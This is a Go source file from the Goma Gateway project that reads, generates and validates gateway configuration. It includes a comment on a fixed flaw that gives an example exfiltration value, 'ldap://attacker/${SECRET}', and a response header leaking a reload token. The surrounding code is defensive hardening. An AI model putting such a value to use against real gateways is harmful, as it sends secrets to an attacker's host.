/*
 * Copyright 2024 Jonas Kaninda
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package internal

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"maps"
	"os"
	"strconv"
	"strings"
	"time"

	goutils "github.com/jkaninda/go-utils"
	"github.com/jkaninda/goma-gateway/internal/middlewares"
	"github.com/jkaninda/goma-gateway/internal/version"
	"github.com/jkaninda/goma-gateway/pkg/certmanager"
	"github.com/jkaninda/goma-gateway/pkg/log"
	"github.com/jkaninda/goma-gateway/pkg/plugins"
	"github.com/jkaninda/goma-gateway/util"
	logger2 "github.com/jkaninda/logger"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/oauth2"
	"golang.org/x/oauth2/amazon"
	"golang.org/x/oauth2/facebook"
	"golang.org/x/oauth2/github"
	"golang.org/x/oauth2/gitlab"
	"golang.org/x/oauth2/google"
	"gopkg.in/yaml.v3"
)

// Environment-variable expansion happens here and nowhere else.
//
// readConfigFile expands the whole file before it is parsed, so every field of
// a configuration the operator wrote on this host is already substituted by the
// time it reaches a validate method. Middleware rules used to be expanded a
// second time, per field — and those methods run for middlewares from *every*
// source, including remote provider bundles, which are unmarshalled straight
// from the wire and never see readConfigFile.
//
// That gave a hostile or MITM'd bundle a read primitive on the gateway's own
// environment: a responseHeaders rule whose value is ${GOMA_RELOAD_TOKEN}
// returned the token on every response, and ldap.url: ldap://attacker/${SECRET}
// exfiltrated out of band. The per-field expansion was redundant for local
// configuration and was the only expansion path for remote configuration, so
// it is gone: file-sourced config still expands, bundle-sourced config does not.
//
// readConfigFile reads a declarative configuration file and expands
// environment-variable references (`${VAR}`) and `{{func()}}` helpers in its
// contents before it is parsed. This lets any field — hosts, redis.password,
// certManager.acme.email, … — be sourced from the environment (e.g. a .env file).
//
// Only the braced `${VAR}` form is substituted, so values that contain a bare
// `$` (bcrypt hashes like `$2y$05$…`, regex patterns) are left untouched, and
// references to unset variables are preserved verbatim rather than blanked.
func readConfigFile(path string) ([]byte, error) {
	buf, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return []byte(goutils.ReplaceEnvVars(string(buf))), nil
}

// Config reads config file and returns Gateway
func (*Goma) Config(configFile string, ctx context.Context) (*Goma, error) {
	if util.FileExists(configFile) {
		buf, err := readConfigFile(configFile)
		if err != nil {
			return nil, err
		}
		util.SetEnv("GOMA_CONFIG_FILE", configFile)
		c := &GatewayConfig{}
		err = yaml.Unmarshal(buf, c)
		if err != nil {
			return nil, fmt.Errorf("parsing the configuration file %q: %w", configFile, err)
		}
		cancelCtx, cancel := context.WithCancel(ctx)
		return &Goma{
			ctx:          cancelCtx,
			ctxCancel:    cancel,
			configFile:   configFile,
			certManager:  c.GetCertManagerConfig(),
			version:      c.Version,
			gateway:      &c.Gateway,
			middlewares:  c.Middlewares,
			pluginConfig: c.Plugins,
			plugins:      map[string]plugins.Middleware{},
		}, nil
	}
	logger.Error("Configuration file not found", "file", configFile)
	// Check a default file
	if util.FileExists(ConfigFile) {
		buf, err := readConfigFile(ConfigFile)
		if err != nil {
			return nil, err

		}
		logger.Info("Using default configuration", "file", ConfigFile)
		util.SetEnv("GOMA_CONFIG_FILE", ConfigFile)
		c := &GatewayConfig{}
		err = yaml.Unmarshal(buf, c)
		if err != nil {
			return nil, fmt.Errorf("parsing the configuration file %q: %w", ConfigFile, err)
		}
		cancelCtx, cancel := context.WithCancel(ctx)
		return &Goma{
			ctx:          cancelCtx,
			ctxCancel:    cancel,
			certManager:  c.GetCertManagerConfig(),
			configFile:   ConfigFile,
			gateway:      &c.Gateway,
			middlewares:  c.Middlewares,
			pluginConfig: c.Plugins,
			plugins:      map[string]plugins.Middleware{},
		}, nil

	}
	logger.Info("Generating new configuration file...")
	// check if config Path does exist
	if !util.FolderExists(ConfigDir) {
		// 0750, not os.ModePerm (0777): this directory holds the gateway
		// configuration, and anything able to write here can add routes.
		err := os.MkdirAll(ConfigDir, 0750)
		if err != nil {
			return nil, err
		}
	}
	err := initConfig(ConfigFile)
	if err != nil {
		return nil, err
	}
	logger.Info("Generating new configuration file...done", "file", ConfigFile)
	util.SetEnv("GOMA_CONFIG_FILE", ConfigFile)
	buf, err := readConfigFile(ConfigFile)
	if err != nil {
		return nil, err
	}
	c := &GatewayConfig{}
	err = yaml.Unmarshal(buf, c)
	if err != nil {
		return nil, fmt.Errorf("in file %q: %w", ConfigFile, err)
	}
	logger.Info("Generating new configuration file...done")
	cancelCtx, cancel := context.WithCancel(ctx)
	return &Goma{
		ctx:          cancelCtx,
		ctxCancel:    cancel,
		configFile:   ConfigFile,
		gateway:      &c.Gateway,
		certManager:  c.GetCertManagerConfig(),
		middlewares:  c.Middlewares,
		pluginConfig: c.Plugins,
		plugins:      map[string]plugins.Middleware{},
	}, nil
}
func (gatewayServer *GatewayConfig) GetCertManagerConfig() *certmanager.Config {
	if gatewayServer.CertManager != nil {
		return gatewayServer.CertManager
	}
	if gatewayServer.CertificateManager != nil {
		logger.Warn("`certificateManager` is deprecated, use `certManager` instead.")
		return gatewayServer.CertificateManager
	}
	return &certmanager.Config{}
}

// InitLogger sets environment variables and initialize the logger
func (g *Goma) InitLogger() {
	level := goutils.Env("GOMA_LOG_LEVEL", strings.ToLower(g.gateway.Log.Level))
	util.SetEnv("GOMA_LOG_LEVEL", level)
	util.SetEnv("GOMA_LOG_FILE", g.gateway.Log.FilePath)
	util.SetEnv("GOMA_LOG_FORMAT", g.gateway.Log.Format)
	util.SetEnv("GOMA_LOG_MAX_AGE_DAYS", strconv.Itoa(g.gateway.Log.MaxAgeDays))
	util.SetEnv("GOMA_LOG_MAX_SIZE_MB", strconv.Itoa(g.gateway.Log.MaxSizeMB))
	util.SetEnv("GOMA_LOG_MAX_BACKUPS", strconv.Itoa(g.gateway.Log.MaxBackups))

	// Update logger with config
	logger = log.InitLogger()
	middlewares.InitLogger(logger)
	// Logging
	if g.gateway.Log.MaxAgeDays > 0 {
		logger = logger.WithOptions(logger2.WithMaxAge(g.gateway.Log.MaxAgeDays))
	}
	if g.gateway.Log.MaxSizeMB > 0 {
		logger = logger.WithOptions(logger2.WithMaxSize(g.gateway.Log.MaxSizeMB))
	}
	if g.gateway.Log.MaxBackups > 0 {
		logger = logger.WithOptions(logger2.WithMaxAge(g.gateway.Log.MaxBackups))
	}
	if level == "debug" || level == "trace" {
		g.gateway.Debug = true
	}

}

// validateRoutes validates routes
func validateRoutes(gateway Gateway, routes []Route) []Route {
	for _, route := range routes {
		route.validateRoute()
	}

	for i := range routes {
		routes[i].handleDeprecations()
		mergeGatewayErrorInterceptor(&routes[i], gateway.ErrorInterceptor)
		mergeGatewayConfig(&routes[i], gateway, &gateway.Cors)
	}

	return routes
}

func validateRouteTLSProviders(routes []Route, cm *certmanager.CertManager) {
	if cm == nil {
		return
	}
	for i := range routes {
		route := &routes[i]
		if route.TLS.Provider == "" || strings.EqualFold(route.TLS.Provider, certmanager.NoneProvider) {
			continue
		}
		if cm.HasProvider(route.TLS.Provider) {
			continue
		}

		fallback := cm.DefaultProvider()
		if fallback != "" && cm.HasProvider(fallback) {
			logger.Warn("Unknown tls.provider on route, falling back to default provider",
				"route", route.Name, "tls.provider", route.TLS.Provider, "fallback", fallback, "configured", cm.ProviderNames())
			route.TLS.Provider = fallback
		} else {
			logger.Error("Unknown tls.provider on route, disabling certificate provisioning for this route",
				"route", route.Name, "tls.provider", route.TLS.Provider, "configured", cm.ProviderNames())
			route.TLS.Provider = certmanager.NoneProvider
		}
	}
}

func (r *Route) validateRoute() {
	if len(r.Name) == 0 {
		logger.Fatal("Route name is required")
	}
	if len(r.Destination) == 0 && len(r.Target) == 0 && len(r.Backends) == 0 {
		logger.Fatal("Route backend error, target or backends should not be empty", "route", r.Name)
	}

}
func mergeGatewayErrorInterceptor(route *Route, gatewayInterceptor middlewares.RouteErrorInterceptor) {
	if gatewayInterceptor.Enabled {
		logger.Warn("ErrorInterceptor defined in gateway level is deprecated, please use the ErrorInterceptor middleware instead.")
		route.ErrorInterceptor.Errors = append(route.ErrorInterceptor.Errors, gatewayInterceptor.Errors...)
		route.ErrorInterceptor.Enabled = true
		if route.ErrorInterceptor.ContentType == "" {
			route.ErrorInterceptor.ContentType = gatewayInterceptor.ContentType
		}
	}
}
func mergeGatewayConfig(route *Route, gateway Gateway, cors *Cors) {
	if route == nil {
		return
	}
	if gateway.Networking.Transport.InsecureSkipVerify {
		logger.Debug(">>> Gateway:: Insecure Skip Verify is enabled")
		route.Security.TLS.InsecureSkipVerify = true
	}
	if !route.Cors.Enabled || cors == nil {
		return
	}
	if route.Cors.isZero() {
		route.Cors = *cors
	}
}
func GetConfigPaths() string {
	return util.GetStringEnv("GOMA_CONFIG_FILE", ConfigFile)
}

// InitConfig initializes configs
func InitConfig(configFile string) error {
	return initConfig(configFile)

}

// *************** DEPRECATIONS ******************************
func (r *Route) handleDeprecations() {
	if r.Disabled {
		logger.Warn("Deprecation: disabled is deprecated, please use enabled")
		r.Enabled = false
	}
	if r.BlockCommonExploits {
		r.Security.EnableExploitProtection = true
		logger.Warn("Deprecation: blockCommonExploits is deprecated, please use `security.enableExploitProtection`")
	}
	if r.InsecureSkipVerify {
		logger.Warn("Deprecation:insecureSkipVerify is deprecated, please use `security.tls.insecureSkipVerify`")
		r.Security.TLS.InsecureSkipVerify = true
	}
	if r.Security.TLS.SkipVerification {
		logger.Warn("Deprecation:skipVerification is deprecated, please use `security.tls.insecureSkipVerify`")
		r.Security.TLS.InsecureSkipVerify = true
	}
	if r.DisableHostForwarding {
		logger.Warn("Deprecation: disableHostForwarding is deprecated, please use `security.forwardHostHeaders`")
		r.Security.ForwardHostHeaders = false
	}
	if r.Destination != "" && len(r.Backends) == 0 {
		logger.Warn("Deprecation: destination is deprecated, please use `target`")
		if r.Target == "" {
			r.Target = r.Destination

		}
	}
}

func (g *Gateway) handleDeprecations() {
	if g.ReadTimeout > 0 {
		logger.Warn("Deprecation: readTimeout is deprecated, please use `timeouts.read`")
		g.Timeouts.Read = g.ReadTimeout
	}
	if g.WriteTimeout > 0 {
		logger.Warn("Deprecation: writeTimeout is deprecated, please use `timeouts.write`")
		g.Timeouts.Write = g.WriteTimeout
	}
	if g.IdleTimeout > 0 {
		logger.Warn("Deprecation: idleTimeout is deprecated, please use `timeouts.idle`")
		g.Timeouts.Idle = g.IdleTimeout
	}
	if g.EnableMetrics {
		g.Monitoring.EnableMetrics = true
	}
	if len(g.TLS.Keys) > 0 {
		g.TLS.Certificates = g.TLS.Keys
		logger.Warn("Deprecation: Gateway: `tls.keys` is deprecated, please use `tls.certificates`")
	}
}

// *************** END DEPRECATIONS ******************************

// initConfig initializes configs
func initConfig(configFile string) error {
	if configFile == "" {
		configFile = GetConfigPaths()
	}
	adminPassword, adminHash, err := scaffoldAdminCredentials()
	if err != nil {
		return err
	}
	conf := &GatewayConfig{
		Version: version.ConfigVersion,
		Gateway: Gateway{
			Log: Log{
				Level:    "info",
				FilePath: "",
			},
			Monitoring: Monitoring{
				EnableMetrics:   true,
				EnableReadiness: false,
				EnableLiveness:  true,
			},
			ExtraConfig: ExtraRouteConfig{
				Directory: ExtraDir,
				Watch:     false,
			},
			Routes: []Route{
				{
					Name:    "example",
					Path:    "/",
					Methods: []string{"GET", "OPTIONS"},
					Target:  "https://example.com",
					Security: Security{
						TLS: SecurityTLS{
							InsecureSkipVerify: true,
							RootCAs:            "",
						},
						ForwardHostHeaders: false,
					},
					Middlewares: []string{"block-access"},
				},
				{
					Name:    "api",
					Path:    "/v1",
					Hosts:   []string{"api.example.com"},
					Rewrite: "/",
					Backends: Backends{
						&Backend{Endpoint: "https://api-1.example.com", Weight: 50},
						&Backend{Endpoint: "https://api-2.example.com", Weight: 20},
						&Backend{Endpoint: "https://api-3.example.com", Weight: 30},
					},
					Middlewares: []string{"basic-auth", "block-access", "block-admin-access"},
				},
			},
		},
		Middlewares: []Middleware{
			{
				Name: "basic-auth",
				Type: BasicAuth,
				Paths: []string{
					"/.*",
				},
				Rule: BasicRuleMiddleware{
					Realm: "Restricted",
					Users: []middlewares.User{
						{Username: "admin", Password: adminHash},
					},
				},
			},
			{
				Name: "block-access",
				Type: AccessMiddleware,
				Paths: []string{
					"/docs/.*",
					"/actuator/.*",
				},
			}, {
				Name: "block-admin-access",
				Type: AccessMiddleware,
				Paths: []string{
					"/admin/.*",
				},
				Rule: AccessRuleMiddleware{
					StatusCode: 404,
				},
			},
			{
				Name: "access-policy",
				Type: accessPolicy,
				Rule: AccessPolicyRuleMiddleware{
					Action: "DENY",
					SourceRanges: []string{
						"10.1.10.0/16",
						"192.168.1.25-192.168.1.100",
						"192.168.1.115",
					},
				},
			},
		},
		CertManager: &certmanager.Config{Provider: certmanager.CertAcmeProvider, Acme: certmanager.Acme{Email: ""}},
	}
	yamlData, err := yaml.Marshal(&conf)
	if err != nil {
		return fmt.Errorf("serializing configuration %v", err.Error())
	}
	// 0600, not 0644: a gateway configuration holds basic-auth credentials, JWT
	// secrets, OIDC client secrets and LDAP bind passwords, and does not belong
	// to every local process.
	err = os.WriteFile(configFile, yamlData, 0600)
	if err != nil {
		return fmt.Errorf("unable to write config file %s", err)
	}

	fmt.Printf("Generated a basic-auth user for the example route:\n  username: admin\n  password: %s\nThis password is shown once. Change or remove the middleware before exposing the gateway.\n", adminPassword)
	return nil
}

// scaffoldAdminCredentials mints a fresh basic-auth password for `goma config
// init`.
//
// The scaffold used to ship a fixed bcrypt hash committed in this repository
// alongside a plaintext user:password pair, so every generated configuration
// had the same working credentials in front of it.
func scaffoldAdminCredentials() (plain string, hash string, err error) {
	raw := make([]byte, 18)
	if _, err = rand.Read(raw); err != nil {
		return "", "", fmt.Errorf("generating an initial password: %w", err)
	}
	plain = base64.RawURLEncoding.EncodeToString(raw)

	hashed, err := bcrypt.GenerateFromPassword([]byte(plain), bcrypt.DefaultCost)
	if err != nil {
		return "", "", fmt.Errorf("hashing the initial password: %w", err)
	}
	return plain, string(hashed), nil
}
func (g *Gateway) Setup(conf string) *Gateway {
	if util.FileExists(conf) {
		buf, err := readConfigFile(conf)
		if err != nil {
			return &Gateway{}
		}
		util.SetEnv("GOMA_CONFIG_FILE", conf)
		c := &GatewayConfig{}
		err = yaml.Unmarshal(buf, c)
		if err != nil {
			logger.Fatal("Error loading configuration %v", err.Error())
		}
		return &c.Gateway
	}
	return &Gateway{}

}

// rateLimitMiddleware returns RateLimitRuleMiddleware, error
func (r *RateLimitRuleMiddleware) validate() error {
	if r.RequestsPerUnit == 0 {
		return fmt.Errorf("requests per unit not defined")

	}
	return nil
}

// validate validates JWTRuleMiddleware
func (jwt JWTRuleMiddleware) validate() error {
	if jwt.Secret == "" && jwt.PublicKey == "" && jwt.JwksUrl == "" && jwt.JwksFile == "" {
		return fmt.Errorf("empty Secret, JwksUrl, JwksFile or  PublicKey in jwt auth middlewares")

	}
	// An empty issuer or audience disables that check entirely rather than
	// failing it. With an identity-provider key source that means every token
	// the provider ever signed — for any tenant, any client — is accepted, so
	// both expectations are required there.
	if jwt.JwksUrl != "" || jwt.JwksFile != "" || jwt.PublicKey != "" {
		if jwt.Issuer == "" {
			return fmt.Errorf("empty issuer in jwt auth middleware: an issuer is required when the key comes from jwksUrl, jwksFile or publicKey")
		}
		if jwt.Audience == "" {
			return fmt.Errorf("empty audience in jwt auth middleware: an audience is required when the key comes from jwksUrl, jwksFile or publicKey")
		}
	} else if jwt.Issuer == "" {
		logger.Warn("JWT middleware has no issuer configured, the issuer claim will not be checked")
	}
	return nil
}

// validate validates JWTRuleMiddleware
func (f *ForwardAuthRuleMiddleware) validate() error {
	if f.SkipInsecureVerify {
		logger.Warn("Deprecation: skipInsecureVerify is deprecated, please use `insecureSkipVerify`")
		f.InsecureSkipVerify = true
	}
	if f.EnableHostForwarding {
		logger.Warn("Deprecation: enableHostForwarding is deprecated, please use `forwardHostHeaders`")
		f.ForwardHostHeaders = true
	}
	if f.AuthURL == "" {
		return fmt.Errorf("error parsing yaml: empty url in forwardAuth middlewares")

	}
	return nil
}

// validate validates RedirectSchemeRuleMiddleware
func (r RedirectSchemeRuleMiddleware) validate() error {
	if r.Scheme == "" {
		return fmt.Errorf("error parsing yaml: empty Scheme in redirectScheme middlewares")

	}
	return nil
}

// validate validates RedirectSchemeRuleMiddleware
func (r RedirectRuleMiddleware) validate() error {
	if r.Url == "" {
		return fmt.Errorf("error parsing yaml: empty Url in redirect middlewares")

	}
	return nil
}

func (r RedirectRegexRuleMiddleware) validate() error {
	if r.Pattern == "" {
		return fmt.Errorf("error parsing yaml: empty Pattern in redirectRegex middlewares")

	}
	if r.Replacement == "" {
		return fmt.Errorf("error parsing yaml: empty Replacement in redirectRegex middlewares")
	}
	return nil
}

// validate validates BasicRuleMiddleware
func (u UserAgentBlockRuleMiddleware) validate() error {
	if len(u.UserAgents) == 0 {
		return fmt.Errorf("empty userAgents in userAgentBlock  middlewares")
	}
	return nil
}

// validate validates GeoBlockRuleMiddleware
func (g GeoBlockRuleMiddleware) validate() error {
	switch strings.ToUpper(g.Action) {
	case "ALLOW", "DENY":
	default:
		return fmt.Errorf("invalid action %q in geoBlock middleware (want ALLOW or DENY)", g.Action)
	}
	if len(g.Countries) == 0 {
		return fmt.Errorf("empty countries in geoBlock middleware")
	}
	for _, c := range g.Countries {
		if len(strings.TrimSpace(c)) != 2 {
			return fmt.Errorf("invalid country %q in geoBlock middleware (want ISO 3166-1 alpha-2, e.g. US)", c)
		}
	}
	return nil
}

// validate validates BasicRuleMiddleware
func (basicAuth *BasicRuleMiddleware) validate() error {
	if len(basicAuth.Users) == 0 {
		return fmt.Errorf("empty users in basic auth middlewares")
	}
	for _, user := range basicAuth.Users {
		if user.Username == "" || user.Password == "" {
			return fmt.Errorf("empty username or password in basic auth middlewares")
		}
	}
	return nil
}
func (l *LdapRuleMiddleware) validate() error {
	if l.URL == "" {
		return fmt.Errorf("LDAP URL is required")
	}
	if l.BaseDN == "" {
		return fmt.Errorf("LDAP BaseDN is required")
	}
	return nil
}
func (a AccessPolicyRuleMiddleware) validate() error {
	if len(a.SourceRanges) == 0 {
		return fmt.Errorf("empty sourceRanges")

	}
	for _, ip := range a.SourceRanges {
		isIP, isCIDR := isIPOrCIDR(ip)
		if isIP {
			if !validateIPAddress(ip) {
				return fmt.Errorf("invalid ip address")
			}
		}
		if isCIDR {
			if !validateCIDR(ip) {
				return fmt.Errorf("invalid cidr address")
			}
		}

	}
	return nil
}

// resolveHeaderValue resolves template variables and environment variables in header values
func (a *ResponseHeader) resolveHeaderValue(value string, route *Route) string {
	if value == "" {
		return value
	}

	// Route and gateway context variables only: environment variables are
	// expanded once, in readConfigFile, and deliberately not for configuration
	// that arrived from a provider bundle.
	return a.replaceContextVariables(value, route)
}

// replaceContextVariables replaces route and gateway context variables
func (a *ResponseHeader) replaceContextVariables(value string, route *Route) string {
	contextVars := map[string]string{
		"{route.name}":      route.Name,
		"{route.path}":      route.Path,
		"{route.target}":    route.Target,
		"{gateway.version}": version.Version,
	}
	result := value
	for placeholder, replaceWith := range contextVars {
		if replaceWith != "" {
			result = strings.ReplaceAll(result, placeholder, replaceWith)
		}
	}

	return result
}
func (a *ResponseHeader) validate(route *Route) error {
	// Check if middleware has any configuration
	if a.Cors == nil && len(a.SetHeaders) == 0 && len(a.SetCookies) == 0 && a.CacheControl == "" {
		return fmt.Errorf("responseHeader middleware '%s' has no configuration (cors, setHeaders, setCookies, or cacheControl required)", a.Name)
	}

	// Validate and process headers
	if err := a.validateHeaders(route); err != nil {
		return fmt.Errorf("invalid headers in middleware '%s': %w", a.Name, err)
	}

	// Validate and process cookies
	if err := a.validateCookies(); err != nil {
		return fmt.Errorf("invalid cookies in middleware '%s': %w", a.Name, err)
	}

	// Validate CORS if present
	if a.Cors != nil {
		if err := a.Cors.validate(); err != nil {
			return fmt.Errorf("invalid CORS config in middleware '%s': %w", a.Name, err)
		}
	}

	// Validate cache control if present
	if err := a.validateCacheControl(); err != nil {
		return fmt.Errorf("invalid cache control in middleware '%s': %w", a.Name, err)
	}

	return nil
}

func (a *ResponseHeader) validateHeaders(r *Route) error {
	if len(a.SetHeaders) == 0 {
		return nil
	}

	// Reserved/dangerous headers that shouldn't be set via middleware
	dangerousHeaders := map[string]bool{
		"content-length":    true,
		"transfer-encoding": true,
		"trailer":           true,
		"connection":        true,
		"upgrade":           true,
	}
	for key, value := range a.SetHeaders {
		if strings.TrimSpace(key) == "" {
			return fmt.Errorf("empty header name found")
		}

		if dangerousHeaders[strings.ToLower(key)] {
			return fmt.Errorf("cannot set reserved header: %s", key)
		}

		// Replace environment variables
		a.SetHeaders[key] = a.resolveHeaderValue(value, r)

		if strings.ContainsAny(a.SetHeaders[key], "\r\n") {
			return fmt.Errorf("header '%s' contains invalid characters (CRLF)", key)
		}
	}

	return nil
}

func (a *ResponseHeader) validateCookies() error {
	if len(a.SetCookies) == 0 {
		return nil
	}

	validSameSite := map[string]bool{
		"":             true,
		sameSiteStrict: true,
		sameSiteLax:    true,
		sameSiteNone:   true,
	}

	cookieNames := make(map[string]bool)

	for i, cookie := range a.SetCookies {
		// Validate cookie name
		if strings.TrimSpace(cookie.Name) == "" {
			return fmt.Errorf("cookie at index %d has empty name", i)
		}

		// Check for duplicate names
		if cookieNames[cookie.Name] {
			return fmt.Errorf("duplicate cookie name: %s", cookie.Name)
		}
		cookieNames[cookie.Name] = true

		// Cookie names can't contain spaces, commas, semicolons, or backslashes
		if strings.ContainsAny(cookie.Name, " ,;\\\t\r\n") {
			return fmt.Errorf("cookie name '%s' contains invalid characters", cookie.Name)
		}

		// Validate cookie value doesn't contain invalid characters (unless it's a removal)
		if cookie.Value != "" && strings.ContainsAny(cookie.Value, "\r\n;,") {
			return fmt.Errorf("cookie '%s' value contains invalid characters", cookie.Name)
		}

		// Validate SameSite
		sameSite := strings.ToLower(cookie.Attrs.SameSite)
		if !validSameSite[sameSite] {
			return fmt.Errorf("cookie '%s' has invalid SameSite value: %s (must be Strict, Lax, None, or empty)",
				cookie.Name, cookie.Attrs.SameSite)
		}

		// SameSite=None requires Secure flag
		if sameSite == sameSiteNone && !cookie.Attrs.Secure {
			return fmt.Errorf("cookie '%s' has SameSite=None but Secure flag is not set", cookie.Name)
		}

		// Validate MaxAge
		if cookie.Attrs.MaxAge < -1 {
			return fmt.Errorf("cookie '%s' has invalid MaxAge: %d (must be >= -1)", cookie.Name, cookie.Attrs.MaxAge)
		}

		// Validate Path format
		if cookie.Attrs.Path != "" && !strings.HasPrefix(cookie.Attrs.Path, "/") {
			return fmt.Errorf("cookie '%s' path must start with '/' or be empty", cookie.Name)
		}

		// Validate Domain format
		if cookie.Attrs.Domain != "" {
			if strings.Contains(cookie.Attrs.Domain, "://") || strings.Contains(cookie.Attrs.Domain, "/") {
				return fmt.Errorf("cookie '%s' has invalid domain format: %s", cookie.Name, cookie.Attrs.Domain)
			}
		}
	}

	return nil
}

func (a *ResponseHeader) validateCacheControl() error {
	if a.CacheControl == "" {
		return nil
	}

	// Validate that CacheControl has proper format
	if strings.ContainsAny(a.CacheControl, "\r\n") {
		return fmt.Errorf("cacheControl contains invalid characters")
	}

	// Validate cache statuses
	for _, status := range a.CacheStatuses {
		if status < 100 || status > 599 {
			return fmt.Errorf("invalid HTTP status code in cacheStatuses: %d", status)
		}
	}
	return nil
}
func (l LogEnrichRule) validate() error {
	if len(l.Headers) == 0 && len(l.Query) == 0 && len(l.Cookies) == 0 {
		return fmt.Errorf("empty headers, query and cookies in log enrich middleware")
	}
	return nil
}

// validate normalizes the rule and rejects a configuration that could not
// actually guard a route.
func (rule *OIDCRuleMiddleware) validate() error {
	rule.applyProviderDefaults()
	rule.warnDeprecatedFields()

	if rule.ClientID == "" || rule.ClientSecret == "" {
		return fmt.Errorf("error parsing yaml: empty clientId/clientSecret in oidc middleware for provider %q", rule.Provider)
	}
	if rule.Issuer == "" && (rule.Endpoint.AuthURL == "" || rule.Endpoint.TokenURL == "") {
		return fmt.Errorf("error parsing yaml: oidc middleware requires issuer, or endpoint.authUrl and endpoint.tokenUrl")
	}
	// Without one of these the gateway has no way to tell a token issued by the
	// provider from one a client made up. Discovery supplies both, so an issuer
	// is enough on its own.
	if rule.Issuer == "" && rule.Endpoint.JwksURL == "" && rule.Endpoint.UserInfoURL == "" {
		return fmt.Errorf("error parsing yaml: oidc middleware requires issuer, endpoint.jwksUrl or endpoint.userInfoUrl to verify tokens")
	}
	for _, source := range rule.ClaimsSource {
		switch source {
		case middlewares.ClaimSourceIDToken, middlewares.ClaimSourceUserInfo, middlewares.ClaimSourceAccessToken:
		default:
			return fmt.Errorf("error parsing yaml: unknown claimsSource %q, expected one of id_token, userinfo, access_token", source)
		}
	}
	if err := rule.Session.validate(); err != nil {
		return err
	}
	return rule.Forward.validate()
}

// validate checks the session rule.
func (s *OIDCSessionRule) validate() error {
	if s == nil {
		return nil
	}
	switch s.Store {
	case "", middlewares.SessionStoreCookie, middlewares.SessionStoreMemory, middlewares.SessionStoreRedis:
	default:
		return fmt.Errorf("error parsing yaml: unknown session.store %q, expected cookie, memory or redis", s.Store)
	}
	for name, value := range map[string]string{"ttl": s.TTL, "idleTimeout": s.IdleTimeout} {
		if value == "" {
			continue
		}
		if _, err := time.ParseDuration(value); err != nil {
			return fmt.Errorf("error parsing yaml: invalid session.%s %q: %w", name, value, err)
		}
	}
	switch strings.ToLower(s.Cookie.SameSite) {
	case "", sameSiteLax, sameSiteStrict, sameSiteNone:
	default:
		return fmt.Errorf("error parsing yaml: unknown session.cookie.sameSite %q, expected lax, strict or none", s.Cookie.SameSite)
	}
	return nil
}

// warnDeprecatedFields tells the operator which replacement to move to, once
// per load rather than per request.
func (rule *OIDCRuleMiddleware) warnDeprecatedFields() {
	if rule.State != "" {
		logger.Warn("oidc: 'state' is ignored, the login state is now random per request")
	}
	if rule.RedirectPath != "" && rule.PostLoginRedirect == "" {
		logger.Warn("oidc: 'redirectPath' is deprecated, use 'postLoginRedirect'")
		rule.PostLoginRedirect = rule.RedirectPath
	}
	if rule.CookiePath != "" && (rule.Session == nil || rule.Session.Cookie.Path == "") {
		logger.Warn("oidc: 'cookiePath' is deprecated, use 'session.cookie.path'")
		if rule.Session == nil {
			rule.Session = &OIDCSessionRule{}
		}
		rule.Session.Cookie.Path = rule.CookiePath
	}
	if rule.RedirectURL != "" && rule.CallbackPath == "" {
		logger.Warn("oidc: 'redirectUrl' is deprecated, use 'callbackPath'")
		rule.CallbackPath = util.UrlParsePath(rule.RedirectURL)
	}
}

// validate checks the claim projection rule.
func (f *ForwardClaimsRule) validate() error {
	if f == nil {
		return nil
	}
	switch f.Encoding {
	case "", middlewares.ClaimEncodingAuto, middlewares.ClaimEncodingRaw:
	default:
		return fmt.Errorf("error parsing yaml: unknown forward.encoding %q, expected auto or raw", f.Encoding)
	}
	if f.StripInbound != nil && !*f.StripInbound {
		logger.Warn("Claim forwarding has stripInbound disabled, clients can forge the forwarded identity headers")
	}
	return nil
}

// claimMapper builds the shared claim projector. legacyHeaders carries the
// deprecated flat forwardHeaders map; keys also present in forward.headers are
// overridden by it.
func claimMapper(rule *ForwardClaimsRule, legacyHeaders map[string]string) *middlewares.ClaimMapper {
	mapper := &middlewares.ClaimMapper{}
	if len(legacyHeaders) > 0 {
		mapper.Headers = maps.Clone(legacyHeaders)
	}
	if rule != nil {
		if len(rule.Headers) > 0 {
			if mapper.Headers == nil {
				mapper.Headers = make(map[string]string, len(rule.Headers))
			}
			maps.Copy(mapper.Headers, rule.Headers)
		}
		mapper.Query = rule.Query
		mapper.Cookies = rule.Cookies
		mapper.StripInbound = rule.StripInbound
		mapper.ArraySeparator = rule.ArraySeparator
		mapper.Encoding = rule.Encoding
		mapper.MaxValueBytes = rule.MaxValueBytes
		mapper.AccessTokenHeader = rule.AccessTokenHeader
		mapper.IDTokenHeader = rule.IDTokenHeader
	}
	if !mapper.Enabled() {
		return nil
	}
	return mapper
}

// applyProviderDefaults fills in the endpoints a well-known provider does not
// need spelled out in the configuration.
func (rule *OIDCRuleMiddleware) applyProviderDefaults() {
	if rule.Provider == "" {
		rule.Provider = middlewares.ProviderCustom
	}
	switch rule.Provider {
	case middlewares.ProviderGoogle:
		rule.setEndpoints(google.Endpoint,
			"https://www.googleapis.com/oauth2/v2/userinfo", "https://www.googleapis.com/oauth2/v3/certs")
	case middlewares.ProviderFacebook:
		rule.setEndpoints(facebook.Endpoint, "https://graph.facebook.com/me?fields=id,name,email", "")
	case middlewares.ProviderGitHub:
		rule.setEndpoints(github.Endpoint, "https://api.github.com/user", "")
	case middlewares.ProviderGitLab:
		rule.setEndpoints(gitlab.Endpoint,
			"https://gitlab.com/oauth/userinfo", "https://gitlab.com/oauth/discovery/keys")
	case middlewares.ProviderAmazon:
		rule.setEndpoints(amazon.Endpoint, "https://api.amazon.com/user/profile", "")
	case middlewares.ProviderCustom:
	default:
		logger.Error("Unknown oidc provider", "provider", rule.Provider)
	}
}

func (rule *OIDCRuleMiddleware) setEndpoints(endpoint oauth2.Endpoint, userInfoURL, jwksURL string) {
	setIfEmpty(&rule.Endpoint.AuthURL, endpoint.AuthURL)
	setIfEmpty(&rule.Endpoint.TokenURL, endpoint.TokenURL)
	setIfEmpty(&rule.Endpoint.UserInfoURL, userInfoURL)
	setIfEmpty(&rule.Endpoint.JwksURL, jwksURL)
}

